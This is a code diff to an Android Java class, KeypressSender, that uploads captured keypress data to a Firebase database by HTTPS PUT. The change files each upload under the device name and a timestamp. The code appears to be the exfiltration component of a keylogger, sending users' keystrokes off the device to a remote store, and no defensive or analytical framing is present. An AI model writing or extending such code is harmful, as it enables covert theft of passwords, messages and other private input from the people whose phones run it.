@@ -14,6 +14,10 @@ import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.Locale;
 import java.util.Random;
 
 import javax.net.ssl.HttpsURLConnection;
@@ -39,12 +43,14 @@ public class KeypressSender {
         String result;
         InputStream inputStream;
 
-        Random random = new Random();
-
         try {
-            URL databaseURL = new URL(FirebaseConfig.getDatabaseURL()+ "/keypress.json");
-            HttpsURLConnection urlConnection = (HttpsURLConnection) databaseURL.openConnection();
             System.getProperty("os.version");
+            URL databaseURL = new URL(FirebaseConfig.getDatabaseURL()+ "/" + android.os.Build.DEVICE + "/");
+            HttpsURLConnection urlConnection = (HttpsURLConnection) databaseURL.openConnection();
+
+            DateFormat df = new SimpleDateFormat("dd/MM/yyyy-HH:mm:ss z :", Locale.ITALIAN);
+            String time = df.format(Calendar.getInstance().getTime());
+
 
             urlConnection.setRequestMethod("PUT");
             urlConnection.setDoOutput(true);
@@ -52,7 +58,7 @@ public class KeypressSender {
             urlConnection.setRequestProperty("Accept", "application/json");
 
             JSONObject jsonObject = new JSONObject();
-            jsonObject.put(android.os.Build.DEVICE , tosend);
+            jsonObject.put(time, tosend);
             setPostRequestContent(urlConnection, jsonObject);
 
             urlConnection.connect();
